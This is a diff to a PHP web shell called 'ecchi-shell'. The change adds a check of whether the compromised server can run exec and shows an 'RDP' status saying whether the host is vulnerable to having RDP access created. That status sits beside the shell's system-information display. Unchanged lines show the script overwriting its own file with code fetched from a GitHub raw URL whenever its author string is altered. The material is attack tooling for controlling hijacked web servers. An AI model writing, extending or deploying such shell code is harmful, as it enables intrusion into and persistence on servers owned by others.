@@ -163,6 +163,8 @@ function shell()
    $disable = @ini_get('disable_functions');
    $disable = (!empty($disable)) ? $disable : 'NONE';
    $os = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
+   $exec2check = (function_exists('exec')) ? 'Enable' : 'Disable';
+   $checkos = ($os !== 'Windows' && $exec2check !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
 ?>
    <!DOCTYPE html>
    <html lang="en">
@@ -239,6 +241,7 @@ function shell()
                      <div class="font-weight-bold text-info">
                         <p>Shell Version : <span class="text-dark"><?= version ?></p>
                         <p>OS : <span class="text-dark"><?= $os ?></p>
+                        <p>RDP : <span class="text-dark"><?= $checkos ?></p>
                         <p>PHP Version : <span class="text-dark"><?= PHP_VERSION ?></p>
                         <p>Software : <span class="text-dark"><?= $_SERVER['SERVER_SOFTWARE'] ?></p>
                         <p>Information System : <span class="text-dark"><?= php_uname() ?></p>
@@ -783,11 +786,12 @@ function shell()
 
 /* Change This For Fun Hehe */
 if (author != './EcchiExploit') {
-   echo '<script>alert("Please Dont Change Author!!")</script>';
    $file = basename($_SERVER['SCRIPT_FILENAME']);
    $open = fopen($file, 'w');
    fwrite($open, file_get_contents('https://raw.githubusercontent.com/dmzhari/ecchi-shell/main/ecchishell.php'));
    fclose($open);
+
+   echo '<script>alert("Please Dont Change Author!!")</script>';
    echo "<script>window.location.href= '" . $_SERVER['PHP_SELF'] . "'</script>";
 } else {
    shell();
